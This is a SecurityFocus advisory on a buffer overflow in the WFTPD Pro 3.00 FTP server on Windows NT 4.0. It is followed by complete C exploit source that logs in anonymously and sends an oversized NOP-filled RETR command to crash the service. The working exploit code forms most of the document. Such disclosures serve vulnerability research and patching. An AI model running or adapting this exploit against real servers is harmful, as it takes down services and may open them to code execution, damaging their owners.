source: http://www.securityfocus.com/bid/2644/info

Invalid long strings submitted using either 'RETR' or 'CWD' commands to a host running WFTPD server, will result in the service terminating due to a buffer overflow. It may be possible for an attacker to execute arbitrary code through this vulnerability.

A restart of the server is required in order to gain normal functionality.

This vulnerability has been reported to exist on systems running Windows NT 4.0 with either SP3, SP4, or SP6 installed.

The problem exists due to the interaction between WFTPD.EXE and the Windows function call 'NTDLL.DLL:RtlFreeHeap()'. 

/* WFTPD Pro 3.00 R4 Buffer Overflow exploit
   written by Len Budney
*/
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

#define BUFSIZE 32774
#define CMD "RETR "  /* Alt: use "CWD " and set OFFSET to 4. */
#define OFFSET 5
void main(){
        int sockfd, s;
	struct sockaddr_in victim;
        char buffer[BUFSIZE];
        char exploitbuffer[BUFSIZE]={CMD};
        char recvbuffer[BUFSIZE];

        sockfd=socket(AF_INET,SOCK_STREAM,0); if(sockfd == -1)perror("socket");
        victim.sin_family=AF_INET;
        victim.sin_addr.s_addr=inet_addr("192.168.197.129");
        victim.sin_port=htons(21);
        s=connect(sockfd, (struct sockaddr*) &victim, sizeof(victim));
        if(s == -1) perror("connect");

        recv(sockfd, recvbuffer, sizeof (recvbuffer),0);
        memset(recvbuffer, '\0',sizeof(recvbuffer));
        send(sockfd, "USER anonymous\r\n",strlen ("USER anonymous\r\n"),0);
        recv(sockfd, recvbuffer, sizeof (recvbuffer),0);
        memset(recvbuffer, '\0',sizeof(recvbuffer));
        send(sockfd, "PASS\r\n",strlen ("PASS\r\n"),0);
        recv(sockfd, recvbuffer, sizeof (recvbuffer),0);
        memset(recvbuffer, '\0',sizeof(recvbuffer));

        memset(exploitbuffer+OFFSET,0x90,sizeof (exploitbuffer)-OFFSET-2);
        sprintf(buffer,"%s\r\n",exploitbuffer);
        send(sockfd, buffer , sizeof(buffer),0);
        recv(sockfd, recvbuffer, sizeof (recvbuffer),0);

        close(sockfd);
	_exit(0);
}